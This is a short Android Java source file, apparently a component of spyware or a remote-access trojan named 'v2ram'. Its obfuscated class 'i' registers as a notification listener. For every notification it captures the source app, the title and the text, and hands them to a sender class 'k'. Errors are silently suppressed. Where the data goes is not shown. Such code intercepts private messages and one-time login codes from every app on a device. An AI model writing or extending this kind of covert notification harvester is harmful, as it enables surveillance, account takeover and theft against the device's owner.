package com.v2ram;

import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class i extends NotificationListenerService {
    @Override public void onNotificationPosted(StatusBarNotification s) {
        try {
            Bundle b = s.getNotification().extras;
            String t = b.getString("android.title", "");
            String x = b.getString("android.text", "");
            k.send("notif|" + s.getPackageName() + "|" + t + "|" + x);
        } catch (Throwable ignored) {}
    }
}